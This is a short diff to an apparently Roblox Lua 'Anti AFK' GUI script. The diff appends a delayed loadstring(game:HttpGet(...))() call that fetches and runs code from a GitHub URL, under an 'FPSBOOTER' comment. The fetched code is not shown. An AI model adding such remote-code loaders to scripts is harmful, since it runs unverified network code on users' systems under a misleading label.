@@ -94,3 +94,6 @@ label.Font = Enum.Font.SourceSansBold
 label.TextSize = 20
 label.Text = "✅ Anti AFK "
 label.Parent = screenGui
+task.wait(10)
+--- FPSBOOTER
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCONCUBETI/Duongcutobeti/refs/heads/main/FPSBOOTER"))()
